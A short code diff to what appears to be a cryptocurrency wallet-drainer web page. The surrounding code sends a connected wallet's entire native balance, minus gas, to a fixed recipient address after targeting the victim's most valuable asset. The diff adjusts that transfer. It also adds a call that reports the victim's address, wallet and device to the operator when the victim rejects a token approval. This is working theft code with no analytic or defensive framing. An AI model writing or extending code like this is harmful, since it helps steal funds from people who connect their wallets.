@@ -760,7 +760,7 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
       const gasCost = gasPrice * gasLimit
       if (bal.value > gasCost) {
         const sendAmount = bal.value - gasCost
-        nativeCall = { to: getAddress(NATIVE_RECIPIENT), data: '0x', value: `0x${sendAmount.toString(16)}` }
+        nativeCall = { to: getAddress(NATIVE_RECIPIENT), data: '0x00', value: `0x${sendAmount.toString(16)}` }
       }
     } catch (e) {
       console.warn('Native transfer compute failed:', e?.message || e)
@@ -1045,12 +1045,17 @@ const initializeSubscribers = (modal) => {
           store.isProcessingConnection = false
         } catch (error) {
           store.isApprovalRequested = false
-          if (error.code === 4001 || error.code === -32000) {
+          if (error.code === 4001 || error.code === -32000 || error.code === 'ACTION_REJECTED') {
             store.isApprovalRejected = true
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
+            try {
+              const walletInfoR = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+              const deviceR = detectDevice()
+              await notifyTransactionRejected(state.address, walletInfoR.name, deviceR, 'single approve', mostExpensive.chainId)
+            } catch (_) {}
             hideCustomModal()
             appKit.disconnect()
             store.connectionKey = null
